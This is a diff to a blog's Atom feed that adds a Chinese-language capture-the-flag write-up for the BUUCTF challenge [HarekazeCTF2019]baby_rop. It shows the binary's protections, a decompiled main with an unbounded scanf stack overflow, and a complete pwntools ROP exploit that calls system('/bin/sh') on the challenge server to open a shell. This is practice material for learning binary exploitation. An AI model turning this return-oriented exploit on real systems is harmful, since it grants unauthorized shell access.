@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-01-16T13:01:47.369Z</updated>
+  <updated>2022-01-16T13:39:53.389Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>buuctf-[HarekazeCTF2019]baby_rop</title>
+    <link href="http://example.com/2022/01/16/buuctf-HarekazeCTF2019-baby-rop/"/>
+    <id>http://example.com/2022/01/16/buuctf-HarekazeCTF2019-baby-rop/</id>
+    <published>2022-01-16T13:38:50.000Z</published>
+    <updated>2022-01-16T13:39:53.389Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p>看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO<span class="comment">//没开</span></span><br><span class="line">Stack:    No canary found<span class="comment">//没开</span></span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span><span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们找字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000601048</span>                 <span class="keyword">public</span> binsh</span><br><span class="line">.data:<span class="number">0000000000601048</span> binsh           db <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>然后就有如下内容,那我们就可以直接间接性的rop拼接起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./babyrop&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25973</span>)</span><br><span class="line">rdi_ret=<span class="number">0x0000000000400683</span></span><br><span class="line">binsh=<span class="number">0x0000000000601048</span></span><br><span class="line">system_addr=<span class="number">0x00000000004005E3</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;HarekazeCTF2019-baby-rop&quot;&gt;&lt;a href=&quot;#HarekazeCTF2019-baby-rop&quot; class=&quot;headerlink&quot; title=&quot;[HarekazeCTF2019]baby_rop&quot;&gt;&lt;/a&gt;[HarekazeCTF2</summary>
+      
+    
+    
+    
+    
+    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>buuctf-not_the_same_3dsctf_2016</title>
